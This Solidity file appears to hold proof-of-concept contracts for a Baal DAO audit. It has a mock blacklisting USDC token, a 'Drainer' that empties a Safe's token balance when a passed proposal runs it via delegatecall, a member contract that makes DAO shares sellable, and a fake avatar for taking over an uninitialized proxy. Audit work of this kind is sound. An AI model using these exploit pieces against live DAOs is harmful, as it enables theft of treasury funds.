// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// @notice Audit-only ERC-20 with a Circle-style blacklist (6 decimals, fixed supply to the deployer).
/// @dev Mirrors FiatTokenV2 semantics: `transfer`, `transferFrom` and `approve` revert when msg.sender,
/// the source or the destination is blacklisted. Never deployed anywhere but the audit anvil.
contract BlacklistToken {
    string public constant name = "USDC-blacklist-mock";
    string public constant symbol = "USDC";
    uint8 public constant decimals = 6;
    uint256 public totalSupply;
    address public immutable blacklister;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) public isBlacklisted;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Blacklisted(address indexed account);
    event UnBlacklisted(address indexed account);

    modifier notBlacklisted(address account) {
        require(!isBlacklisted[account], "Blacklistable: account is blacklisted");
        _;
    }

    /// @param supply Units (6 dec) minted to the deployer, who is also the blacklister.
    constructor(uint256 supply) {
        blacklister = msg.sender;
        totalSupply = supply;
        balanceOf[msg.sender] = supply;
        emit Transfer(address(0), msg.sender, supply);
    }

    /// @notice Add `account` to the blacklist (blacklister only).
    function blacklist(address account) external {
        require(msg.sender == blacklister, "Blacklistable: caller is not the blacklister");
        isBlacklisted[account] = true;
        emit Blacklisted(account);
    }

    /// @notice Remove `account` from the blacklist (blacklister only).
    function unBlacklist(address account) external {
        require(msg.sender == blacklister, "Blacklistable: caller is not the blacklister");
        isBlacklisted[account] = false;
        emit UnBlacklisted(account);
    }

    function approve(address spender, uint256 amount) external notBlacklisted(msg.sender) notBlacklisted(spender) returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external notBlacklisted(msg.sender) notBlacklisted(to) returns (bool) {
        _move(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external notBlacklisted(msg.sender) notBlacklisted(from) notBlacklisted(to) returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "ERC20: transfer amount exceeds allowance");
        allowance[from][msg.sender] = allowed - amount;
        _move(from, to, amount);
        return true;
    }

    function _move(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "ERC20: transfer amount exceeds balance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
    }
}

interface IERC20Audit {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface IBaalAudit {
    function submitProposal(bytes calldata proposalData, uint32 expiration, uint256 baalGas, string calldata details) external payable returns (uint256);
    function submitVote(uint32 id, bool approved) external;
    function ragequit(address to, uint256 sharesToBurn, uint256 lootToBurn, address[] calldata tokens) external;
}

interface IDepositAudit {
    function deposit(uint256 amount) external returns (uint256);
}

/// @notice Audit-only payload for a delegatecall entry of the voted MultiSend: runs in the Safe's
/// context and moves the Safe's whole `token` balance to `to`. Shows what a proposal can hide behind
/// operation = 1 (no `USDC.transfer` call from the Safe appears in the decoded calls).
contract Drainer {
    /// @param token The ERC-20 to move (the Safe's balance, since this runs via delegatecall).
    /// @param to Recipient.
    function drain(address token, address to) external {
        uint256 held = IERC20Audit(token).balanceOf(address(this));
        require(IERC20Audit(token).transfer(to, held), "drain");
    }
}

/// @notice Audit-only contract that is a DAO member: it deposits, votes, submits and ragequits on
/// the instruction of its `owner`, and `owner` can be sold (setOwner). Demonstrates that a contract
/// member turns non-transferable shares into transferable control.
contract MemberContract {
    address public owner;

    error OnlyOwner(address caller);

    modifier onlyOwner() {
        if (msg.sender != owner) revert OnlyOwner(msg.sender);
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    /// @notice Hand control of this member (its shares, its vote, its exit) to `next`.
    function setOwner(address next) external onlyOwner {
        owner = next;
    }

    /// @notice Approve the shaman and deposit `amount` of `token`; shares are minted to this contract.
    function deposit(address shaman, address token, uint256 amount) external onlyOwner returns (uint256) {
        require(IERC20Audit(token).approve(shaman, amount), "approve");
        return IDepositAudit(shaman).deposit(amount);
    }

    /// @notice Vote with this contract's shares.
    function vote(address baal, uint32 id, bool approved) external onlyOwner {
        IBaalAudit(baal).submitVote(id, approved);
    }

    /// @notice Submit (and self-sponsor when above threshold) a proposal.
    function submit(address baal, bytes calldata data, string calldata details) external onlyOwner returns (uint256) {
        return IBaalAudit(baal).submitProposal(data, 0, 0, details);
    }

    /// @notice Ragequit `shares` for `tokens`, paid to `to`.
    function ragequit(address baal, address to, uint256 shares, address[] calldata tokens) external onlyOwner {
        IBaalAudit(baal).ragequit(to, shares, 0, tokens);
    }

    /// @notice Deposit and ragequit in one transaction (round trip inside one block).
    function roundTrip(address shaman, address token, address baal, uint256 amount, address[] calldata tokens) external onlyOwner returns (uint256 minted) {
        require(IERC20Audit(token).approve(shaman, amount), "approve");
        minted = IDepositAudit(shaman).deposit(amount);
        IBaalAudit(baal).ragequit(address(this), minted, 0, tokens);
    }

    /// @notice Forward any token this contract holds to `to`.
    function sweep(address token, address to) external onlyOwner {
        require(IERC20Audit(token).transfer(to, IERC20Audit(token).balanceOf(address(this))), "sweep");
    }
}

/// @notice Audit-only stand-in for a Safe: accepts any module call. Used to show that an uninitialized
/// Baal proxy can be initialized by anyone with an avatar of their choosing.
contract FakeAvatar {
    /// @notice Zodiac module hook; always succeeds and executes nothing.
    function execTransactionFromModule(address, uint256, bytes calldata, uint8) external pure returns (bool) {
        return true;
    }

    /// @notice Zodiac module hook with return data; always succeeds and executes nothing.
    function execTransactionFromModuleReturnData(address, uint256, bytes calldata, uint8) external pure returns (bool, bytes memory) {
        return (true, "");
    }
}
